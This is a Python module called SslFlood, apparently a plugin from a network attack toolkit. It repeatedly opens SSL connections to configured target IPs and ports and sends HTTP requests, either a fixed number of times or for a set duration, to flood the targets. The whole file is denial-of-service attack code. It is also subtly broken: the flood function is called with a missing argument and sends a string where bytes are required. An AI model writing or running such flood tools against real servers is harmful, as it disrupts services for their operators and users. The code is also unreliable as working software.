from scapy.all import *
import socket
import ssl

from lib.cmd_tool import *

NAME = 'SslFlood'

class Module:
    def __init__(self):
        self.config = {

        }

        self.help = ''

    def validate(self) -> bool:
        
        return True

    def interactive(self):
        interactive(self, 'ssl_flood')

    def init_socket(self, nTimeout: int) -> socket.socket:
        try:
            nTimeout = int(get_value(self.config, 'Timeout'))

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(nTimeout)

            ssl_sock = ssl.wrap_socket(sock)
            
            return ssl_sock

        except Exception as ex:
            cp.pf_failed(str(ex))
            return None

    def run(self):
        def ssl_flood(szIP: str, nPort: int, nTimeout: int):
            ssl_sock = self.init_socket(nTimeout)

            ssl_sock.connect((szIP, nPort))

            ssl_sock.send(f'Get /{randInt()} HTTP/1.1\r\nHost: whatisthis.com\r\n\r\n')
            ssl_sock.close()

        try:
            lsIP = str2strls(get_value(self.config, 'IP'))
            lsPort = str2intls(get_value(self.config, 'Ports'))
            nCount = int(get_value(self.config, 'Count'))
            nTime = int(get_value(self.config, 'Time'))
            nTimeout = int(get_value(self.config, 'Timeout'))
            nMode = int(get_value(self.config, 'Mode'))

            total = 0

            for ip in lsIP:
                for port in lsPort:
                    if nMode == MODE_COUNT:
                        for _ in range(0, nCount):
                            ssl_flood(ip, port)
                            total += 1

                    elif nMode == MODE_TIME:
                        total += doWorkWithSeconds(ssl_flood, nTime, {'szIP': ip, 'nPort': port, 'nTimeout': nTimeout})
            
            cp.pf_ok(f'Done, total={total}')

        except Exception as ex:
            cp.pf_failed(str(ex))